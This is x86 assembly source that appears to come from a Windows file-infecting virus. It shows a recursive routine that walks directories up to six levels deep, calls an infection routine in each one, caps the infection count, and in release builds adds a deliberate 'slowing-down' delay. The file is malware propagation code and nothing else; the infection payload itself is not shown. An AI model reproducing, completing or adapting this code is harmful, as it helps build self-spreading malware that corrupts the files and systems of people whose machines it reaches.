locals __
locals @@
__x	equ rec;dta
reccnt equ 6
		; recursive infecting

recinf:

		; in stack:
		; dir = directory at start and at end of infecting
dir		equ ebx+08h

hnd	equ ebx-4 ptr 4h
stsize equ 256    ; arguments size 
__localssize2	equ 8


	push ebx
	mov ebx, esp
	sub esp, __localssize2

	cmp [countinfect], max
	jg enddirsearch

	inc [level]
	lea eax, [dir]
	push eax
	xcall SetCurrentDirectoryA
	; exit if cannot chdir
	or eax, eax
	jz @01

	pushad
	call infectdir
	popad

IF RELEASE EQ 1
	push 30
	xcall Sleep ; slowing-down
ENDIF

nodelay:
	cmp [level], reccnt
	jnb @01

	cmp [countinfect], max
	jg @01

	push 0
	push '*'
	mov ecx, esp
	lea eax, [fdata]
	push eax
	push ecx
	xcall FindFirstFileA
	add esp, 8
	mov [hnd], eax
	cmp eax,-1
	jz @01 

godir:
	lea esi, [fdata]
	and [esi].fd_attr, 10h ;FILE_ATTRIBUTE_DIRECTORY
	jz nextdir
	lea ecx, [esi].fd_fname
	cmp 2 ptr [ecx], 002eh ; skip current dir
	jz nextdir
	push ecx
	xcall SetCurrentDirectoryA

	; get current directory
	lea esi, [tempdir]
	push esi
	push esi
	push 255
	xcall GetCurrentDirectoryA

	pop esi
	; next level of recursion
	sub esp, stsize
	lea edi, [esp]
	mov ecx, 256
	cld
	rep movsb
	call recinf
	add esp, stsize

nextdir:
	; restore initial directory
	lea eax, [dir]
	push eax
	xcall SetCurrentDirectoryA
	; find next directory
	lea eax, [fdata]
	push eax
	push [hnd]
	xcall FindNextFileA
	or eax,eax
	jnz godir

enddirsearch:
	push [hnd]
	xcall FindClose

@01:
	lea eax, [dir]
	push eax
	xcall SetCurrentDirectoryA

	dec [level] ; previous level
	add esp, __localssize2
	mov esp, ebx
	pop ebx
	ret
